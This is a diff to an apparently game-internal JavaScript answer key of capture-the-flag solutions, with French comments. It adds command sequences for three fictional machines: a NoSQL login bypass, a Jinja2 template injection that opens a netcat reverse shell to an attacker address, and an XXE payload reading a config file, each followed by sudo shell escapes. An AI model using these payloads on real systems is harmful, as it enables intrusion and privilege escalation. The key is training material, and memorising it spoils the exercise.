@@ -98,6 +98,20 @@ const SOLUTIONS = {
     "echo copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\svc.exe >> C:\\Scripts\\backup.bat",
     "whoami", "C:\\Windows\\Temp\\svc.exe", "type root.txt",
   ],
+  // AETHER : injection NoSQL (opérateur $ne dans le body JSON) sur une API de login.
+  aether: [
+    "nmap 10.10.11.90", "curl http://10.10.11.90/", "curl http://10.10.11.90/api/docs",
+    'curl -d \'{"user":"admin","pass":{"$ne":null}}\' http://10.10.11.90/api/login',
+    "ssh tbernard@10.10.11.90", { pw: true }, "cat user.txt", "sudo -l",
+    "sudo taskset 1 /bin/sh", "cat /root/root.txt",
+  ],
+  // ECLIPSE : SSTI (Jinja2) -> RCE via callback nc. `exit` d'abord pour écouter.
+  eclipse: [
+    "exit", "nmap 10.10.11.195", "curl http://10.10.11.195:8081/",
+    'curl "http://10.10.11.195:8081/report?name={{7*7}}"', "nc -lvnp 4444",
+    "curl \"http://10.10.11.195:8081/report?name={{ os.popen('nc 10.10.14.1 4444 -e /bin/sh').read() }}\"",
+    "cat user.txt", "sudo -l", "sudo nice /bin/sh", "cat /root/root.txt",
+  ],
   stratus: [
     "nmap 10.10.11.120", "curl http://10.10.11.120/", "cloudctl ls",
     "cloudctl ls s3://stratus-prod-backups", "cloudctl get s3://stratus-prod-backups/deploy.env",
@@ -124,6 +138,13 @@ const SOLUTIONS = {
       "sudo perl -e 'exec \"/bin/sh\";'", "cat /root/root.txt",
     ],
   },
+  // VESPER : XXE (entité externe déclarant file:///etc/vesper/service.conf) -> fuite de creds SSH.
+  vesper: [
+    "nmap 10.10.11.162", "curl http://10.10.11.162:8090/",
+    'curl -d \'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/vesper/service.conf">]><r>&x;</r>\' http://10.10.11.162:8090/api/import',
+    "ssh kbrennan@10.10.11.162", { pw: true }, "cat user.txt", "sudo -l",
+    "sudo setsid /bin/sh", "cat /root/root.txt",
+  ],
   // TEMPEST : bucket de déploiement inscriptible -> RCE. `exit` d'abord pour écouter.
   tempest: [
     "exit", "nmap 10.10.11.150", "curl http://10.10.11.150:8080/", "cloudctl ls",
